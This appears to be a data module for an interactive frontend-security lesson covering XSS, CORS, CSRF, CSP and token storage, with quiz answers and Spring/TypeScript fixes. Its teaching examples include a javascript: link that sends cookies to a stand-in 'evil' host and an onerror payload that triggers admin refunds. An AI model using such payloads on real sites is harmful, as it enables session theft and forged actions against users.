IA.register({
  track: 'frontend',
  slug: 'fe-security',
  title: 'Frontend security',
  tagline: 'The browser runs every script on your page with your users’ privileges. Frontend security is about <b>never letting data become code</b> (XSS), knowing what the <b>same-origin policy</b> and CORS really protect, stopping <b>forged requests</b> (CSRF) and choosing where tokens live.',
  tldr: {
    problem: 'One unescaped comment can run an attacker’s script as your logged-in user. A misread CORS config is either a broken app or an open door. Tokens in <code>localStorage</code> are one XSS away from being stolen.',
    model: '<b>XSS</b>: untrusted data interpreted as HTML/JS; fix with contextual escaping, sanitising and CSP. <b>CORS</b>: a server opting <i>in</i> to letting other origins read responses; enforced by browsers, not a server firewall. <b>CSRF</b>: the browser auto-attaching cookies to a forged request; fix with SameSite cookies and tokens. Prefer <b>HttpOnly cookies</b> (often via a BFF) over JS-readable tokens.',
    hook: '“Does CORS protect my API from attackers?” No. It stops other <i>websites</i> in a user’s browser from reading responses. curl, Postman and server-side scripts ignore it completely. Authentication and authorisation protect your API.',
    facts: [
      { v: 'origin', l: '= scheme + host + port. <code>https://a.com</code> and <code>https://a.com:8443</code> are different origins' },
      { v: 'HttpOnly', l: 'cookies with this flag can’t be read by JavaScript, so XSS can’t exfiltrate them (it can still make requests)' },
      { v: '* + creds', l: '<code>Access-Control-Allow-Origin: *</code> is not allowed for credentialed requests; browsers reject the response' }
    ]
  },
  intro: {
    what: 'Websites from different <b>origins</b> share one browser. The <b>same-origin policy</b> stops a script from evil.com reading your bank’s pages. Attacks try to get around it: by injecting script into your page (<b>XSS</b>), by making the user’s browser send requests it didn’t mean to (<b>CSRF</b>), or by tricking misconfigured servers into sharing data cross-origin (<b>CORS</b> mistakes).',
    analogy: { icon: '🏢', title: 'Office building badges', text: 'Each company (origin) has its own floor. Your badge (cookie) opens your floor automatically. XSS is a stranger getting a desk <i>inside</i> your office. CSRF is someone sending a letter that tricks the receptionist into using your badge. CORS is a company choosing which visitors may read its notice board.' },
    steps: [
      { t: 'Escape output by default', d: 'React <code>{value}</code>, Vue <code>{{ value }}</code>, Thymeleaf <code>th:text</code> and <code>textContent</code> all escape. <code>innerHTML</code>, <code>v-html</code>, <code>dangerouslySetInnerHTML</code> and <code>th:utext</code> don’t.' },
      { t: 'Add a Content Security Policy', d: 'A header that tells the browser which scripts may run.', code: "Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'", lang: 'text' },
      { t: 'Configure CORS narrowly', d: 'Allow exact origins, only needed methods and headers. Or avoid it: serve UI and API from one origin.' },
      { t: 'Harden cookies', d: '<code>Secure; HttpOnly; SameSite=Lax</code>, and a <code>__Host-</code> prefix for session cookies.' },
      { t: 'Keep CSRF protection on', d: 'For cookie-authenticated APIs, keep Spring Security’s CSRF protection and send the token from the SPA.' }
    ],
    terms: [
      ['origin', 'Scheme + host + port, e.g. <code>https://app.example.com:443</code>.'],
      ['site', 'Registrable domain + scheme, e.g. <code>https://example.com</code>. <code>a.example.com</code> and <code>b.example.com</code> are same-site, cross-origin.'],
      ['XSS', 'Cross-site scripting: attacker-controlled script running in your page.'],
      ['CSP', 'Content Security Policy: a response header restricting script, style, frame and connection sources.'],
      ['CORS', 'Cross-Origin Resource Sharing: headers that let a server allow cross-origin reads.'],
      ['CSRF', 'Cross-site request forgery: a forged state-changing request riding on the victim’s cookies.']
    ]
  },
  visual: {
    title: 'Three attacks, three defences',
    caption: 'Pick <b>XSS & CSP</b>, <b>CORS preflight</b> or <b>CSRF & SameSite</b> and press Play or Step. Red is the attack succeeding, green is the defence.'
  },
  gotchas: [
    { trap: 'Rendering “trusted” HTML from the API', code: `<div v-html="product.description"></div>\n<div dangerouslySetInnerHTML={{ __html: comment.body }} />`, why: 'Anything a user, admin, CMS or partner feed can edit is untrusted. One malicious string executes in every viewer’s session.', fix: 'Render as text. If rich text is required, sanitise with DOMPurify (client) or OWASP Java HTML Sanitizer (server) using an allow-list, and keep a strict CSP.' },
    { trap: '<code>javascript:</code> URLs in links', code: `<a href={user.website}>Website</a>   // "javascript:fetch('//evil/?c='+document.cookie)"`, why: 'Escaping HTML doesn’t help inside a URL attribute. React warns about <code>javascript:</code> URLs but historically still rendered them.', fix: 'Validate URLs: parse with <code>new URL()</code> and allow only <code>http:</code>/<code>https:</code> (and <code>mailto:</code> if needed).' },
    { trap: 'Reflecting the Origin header in CORS', code: `// "make CORS errors go away"\nresponse.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));\nresponse.setHeader("Access-Control-Allow-Credentials", "true");`, lang: 'java', why: 'Every website can now make credentialed requests to your API and read the responses: the user’s data leaks to any page they visit.', fix: 'Allow-list exact origins (<code>allowedOrigins</code> or carefully scoped <code>allowedOriginPatterns</code> in Spring). Never combine reflection with credentials.' },
    { trap: 'Disabling CSRF because “it’s a REST API”', code: `http.csrf(csrf -> csrf.disable());   // but auth is a session cookie`, lang: 'java', why: 'If the browser authenticates with a cookie, CSRF applies, REST or not. It is safe to disable only when credentials are never sent automatically (e.g. an <code>Authorization: Bearer</code> header set by JS).', fix: 'Keep CSRF on and use a cookie-to-header token for the SPA (Spring’s <code>CookieCsrfTokenRepository</code>; follow the Spring Security reference for the SPA token handler in your version).' },
    { trap: 'Access tokens in localStorage', why: 'Any XSS can read localStorage and send the token to the attacker, who can then use it from anywhere until it expires.', fix: 'Prefer a <b>BFF</b> (backend-for-frontend) that holds tokens server-side and gives the browser an HttpOnly, SameSite session cookie. If tokens must be in the browser, keep them in memory, short-lived, with refresh token rotation.' },
    { trap: 'CSP with <code>\'unsafe-inline\'</code>', code: `Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdn.example.com`, lang: 'text', why: '<code>\'unsafe-inline\'</code> allows exactly what XSS needs: inline scripts and event handlers. Broad host allow-lists are often bypassable via JSONP or old libraries on that host.', fix: 'Use a nonce- or hash-based strict CSP with <code>\'strict-dynamic\'</code>. Roll out with <code>Content-Security-Policy-Report-Only</code> first.' }
  ],
  scenarios: [
    { title: 'Support agents’ sessions hijacked through a ticket subject',
      symptom: 'Several admin accounts performed refunds nobody remembers. All had viewed one support ticket.',
      diagnose: `-- the ticket subject\n<img src=x onerror="fetch('/api/admin/refund',{method:'POST',body:…})">\n// admin UI: <td v-html="ticket.subject"> added for "bold keywords"`,
      cause: 'Stored XSS: a customer-controlled field rendered with <code>v-html</code> in an internal tool. No CSP, because “it’s internal”.',
      fix: 'Render as text, highlight keywords with safe components, add a strict CSP to internal tools too, and require re-authentication for refunds.',
      fixCode: `// Spring Security 6: CSP header (use a per-request nonce for inline scripts)\nhttp.headers(h -> h.contentSecurityPolicy(csp -> csp.policyDirectives(\n  "script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'")));` },
    { title: '“CORS error” fixed in production by allowing everything',
      symptom: 'A partner integration failed with CORS errors. A hotfix set <code>allowedOriginPatterns("*")</code> with <code>allowCredentials(true)</code>. Weeks later, a security researcher reads users’ profiles from a test page.',
      diagnose: `curl -s -H 'Origin: https://evil.example' -I https://api.example.com/me\n# access-control-allow-origin: https://evil.example\n# access-control-allow-credentials: true`,
      cause: 'Origin patterns with <code>*</code> plus credentials effectively reflect any origin, so any website can read authenticated responses.',
      fix: 'Allow-list exact origins per environment; partners integrate server-to-server, where CORS doesn’t apply anyway.',
      fixCode: `@Bean CorsConfigurationSource cors() {\n  var c = new CorsConfiguration();\n  c.setAllowedOrigins(List.of("https://app.example.com"));\n  c.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));\n  c.setAllowedHeaders(List.of("Content-Type", "X-XSRF-TOKEN"));\n  c.setAllowCredentials(true);\n  var s = new UrlBasedCorsConfigurationSource(); s.registerCorsConfiguration("/api/**", c); return s;\n}`, lang: 'java' }
  ],
  puzzles: [
    { kind: 'concept', q: 'Which React code is vulnerable to XSS with <code>name = "&lt;img src=x onerror=alert(1)&gt;"</code>?', code: `// A\n<p>{name}</p>\n// B\n<p dangerouslySetInnerHTML={{ __html: name }} />\n// C\n<input value={name} />\n// D\n<p title={name}>hi</p>`, options: ['A', 'B', 'C', 'D'], answer: 1, explain: 'React escapes text and attribute values (A, C, D). Only B inserts raw HTML.' },
    { kind: 'concept', q: 'Are <code>https://app.example.com</code> and <code>https://api.example.com</code> same-origin, same-site, both or neither?', options: ['Same-origin and same-site', 'Cross-origin but same-site', 'Same-origin but cross-site', 'Neither'], answer: 1, explain: 'Different hosts → different origins (CORS applies). Same registrable domain and scheme → same-site (SameSite cookies are sent).' },
    { kind: 'concept', q: 'A <code>fetch</code> POST with <code>Content-Type: application/json</code> to another origin. What does the browser do first?', options: ['Sends it directly', 'Sends an OPTIONS preflight', 'Blocks it', 'Converts it to form data'], answer: 1, explain: 'JSON content type is not one of the three “simple” types (form-urlencoded, multipart, text/plain), so a preflight is required.' },
    { kind: 'concept', q: 'A cross-origin simple POST (form-encoded) is sent but the server returns no CORS headers. What happened on the server?', options: ['Nothing; the browser blocked it', 'It processed the request; the browser only hid the response from JS', 'It returned 403 automatically', 'It received an OPTIONS only'], answer: 1, explain: 'Simple requests are sent without a preflight. CORS controls reading the response. That is why state-changing endpoints need CSRF protection.' },
    { kind: 'concept', q: 'Where is the safest place for a SPA’s session credential against XSS theft?', options: ['localStorage', 'sessionStorage', 'An HttpOnly, Secure, SameSite cookie (e.g. set by a BFF)', 'A global JS variable'], answer: 2, explain: 'JS can’t read HttpOnly cookies, so XSS can’t exfiltrate them. XSS can still act within the page while it runs, so you still need XSS prevention.' },
    { kind: 'concept', q: 'Which cookie attribute stops it from being sent on a cross-site form POST?', options: ['HttpOnly', 'Secure', 'SameSite=Lax or Strict', 'Path=/'], answer: 2, explain: 'Lax sends cookies on top-level cross-site GET navigations only; Strict never on cross-site requests. HttpOnly is about JS access, Secure about HTTPS.' },
    { kind: 'concept', q: 'What does Trusted Types (<code>require-trusted-types-for \'script\'</code>) do?', options: ['Encrypts the DOM', 'Makes DOM XSS sinks like innerHTML reject plain strings unless they come from an approved policy', 'Blocks all third-party scripts', 'Signs JavaScript files'], answer: 1, explain: 'A CSP directive that turns dangerous sinks into type-checked APIs. Supported in Chromium-based browsers; others are adding support.' }
  ],
  interview: [
    { q: 'What are the types of XSS and how do you prevent them?', a: '<p><b>Stored</b> (saved and shown to others), <b>reflected</b> (echoed from the request), and <b>DOM-based</b> (client code writes untrusted data to a sink like <code>innerHTML</code>, <code>eval</code>, <code>location</code>). Prevention: contextual output encoding (framework defaults), avoid raw-HTML sinks, sanitise when HTML is required, validate URLs, strict CSP, Trusted Types, HttpOnly cookies to limit impact.</p>', lvl: 'core' },
    { q: 'Explain the same-origin policy and CORS.', a: '<p>SOP: scripts may freely <i>read</i> only responses from their own origin. Embedding (img, script, form posts) is allowed; reading is not. CORS is the controlled opt-out: the server returns <code>Access-Control-Allow-Origin</code> (and friends) to allow named origins to read. Non-simple requests trigger a preflight <code>OPTIONS</code>. CORS is enforced by browsers and adds no protection against non-browser clients.</p>', lvl: 'core' },
    { q: 'What is CSRF and how do you defend against it?', a: '<p>A malicious site makes the victim’s browser send a state-changing request to your site, which carries the victim’s cookies. Defences: <code>SameSite=Lax/Strict</code> cookies, synchroniser or double-submit CSRF tokens (Spring Security’s default protection), checking <code>Origin</code>/<code>Sec-Fetch-Site</code>, and never changing state on GET. Bearer tokens in headers are not CSRF-prone, but they move the risk to XSS.</p>', lvl: 'core' },
    { q: 'localStorage token vs HttpOnly cookie: which and why?', a: '<p><b>localStorage</b>: simple, no CSRF, but any XSS can steal the token and use it elsewhere. <b>HttpOnly cookie</b>: XSS can’t read it, but you need CSRF protection and same-site deployment. Current best practice for browser apps (OAuth 2.0 for Browser-Based Apps draft) favours a <b>BFF</b>: the backend does the OAuth flow, keeps tokens server-side, and gives the browser a session cookie.</p>', lvl: 'deep' },
    { q: 'What does a strict CSP look like and how do you roll it out?', a: '<p><code>script-src \'nonce-{random}\' \'strict-dynamic\'; object-src \'none\'; base-uri \'none\'</code>, with a fresh nonce per response on every legitimate script tag. <code>\'strict-dynamic\'</code> lets those scripts load others. Roll out with <code>Report-Only</code> and a <code>report-to</code> endpoint, fix violations, then enforce. Add <code>frame-ancestors</code> to prevent clickjacking.</p>', lvl: 'deep' },
    { q: 'Why can’t you use Allow-Origin * with cookies?', a: '<p>The spec forbids <code>*</code> with <code>Access-Control-Allow-Credentials: true</code>; the browser rejects the response. Otherwise any site could read authenticated data. You must echo a specific, allow-listed origin and add <code>Vary: Origin</code> so caches don’t serve one origin’s CORS headers to another.</p>', lvl: 'deep' },
    { q: 'What is clickjacking?', a: '<p>Your page is loaded invisibly in an iframe on an attacker’s page, and the user is tricked into clicking your buttons. Prevent framing with <code>Content-Security-Policy: frame-ancestors \'none\'</code> (or an allow-list); <code>X-Frame-Options: DENY</code> is the legacy header. Spring Security sends X-Frame-Options by default.</p>', lvl: 'core' },
    { q: 'How do you protect against compromised third-party scripts?', a: '<p>Self-host and pin dependencies where possible; <b>Subresource Integrity</b> (<code>integrity="sha384-…"</code>) for static CDN files; strict CSP; lockfile and dependency scanning (npm audit, Dependabot, Renovate); load tag managers in a restricted way or in sandboxed iframes. Supply-chain attacks on npm packages are a real, recurring risk.</p>', lvl: 'deep' },
    { q: 'Which security headers would you set for a SPA?', a: '<ul><li><code>Content-Security-Policy</code> (incl. <code>frame-ancestors</code>)</li><li><code>Strict-Transport-Security</code></li><li><code>X-Content-Type-Options: nosniff</code></li><li><code>Referrer-Policy: strict-origin-when-cross-origin</code></li><li><code>Permissions-Policy</code> to disable unused features</li><li>Cookies: <code>Secure; HttpOnly; SameSite</code>, <code>__Host-</code> prefix</li></ul>', lvl: 'core' },
    { q: 'Is frontend input validation a security control?', a: '<p>No. It is UX. Anyone can bypass it by calling the API directly. All validation and authorisation must happen on the server; the frontend repeats it for fast feedback.</p>', lvl: 'core' }
  ],
  code: [
    { title: 'Spring Security 6 for a same-site SPA with cookie sessions', lang: 'java', code: `@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
  return http
    .csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))  // XSRF-TOKEN cookie
    .cors(Customizer.withDefaults())                       // uses the CorsConfigurationSource bean
    .headers(h -> h
      .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; object-src 'none'; frame-ancestors 'none'"))
      .referrerPolicy(r -> r.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)))
    .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
    .authorizeHttpRequests(a -> a.requestMatchers("/api/**").authenticated().anyRequest().permitAll())
    .build();
}
// application.yml: server.servlet.session.cookie: { http-only: true, secure: true, same-site: lax }`, note: 'Spring Security 6 XOR-masks CSRF tokens (BREACH protection); SPAs reading the raw cookie need the SPA-specific request handler described in the Spring Security reference for your version.' },
    { title: 'Sending the CSRF token and sanitising rich text', lang: 'ts', code: `// fetch wrapper: copy the XSRF-TOKEN cookie into a header (Axios does this automatically)
function csrf(): string {
  return document.cookie.split('; ').find((c) => c.startsWith('XSRF-TOKEN='))?.split('=')[1] ?? '';
}
export const api = (url: string, init: RequestInit = {}) =>
  fetch(url, { ...init, credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json', 'X-XSRF-TOKEN': decodeURIComponent(csrf()), ...init.headers } });

// when HTML really must be rendered
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'], ALLOWED_ATTR: ['href'] });

// safe link check
const safeHref = (u: string) => { try { return ['http:', 'https:'].includes(new URL(u).protocol) ? u : '#'; } catch { return '#'; } };` }
  ]
});
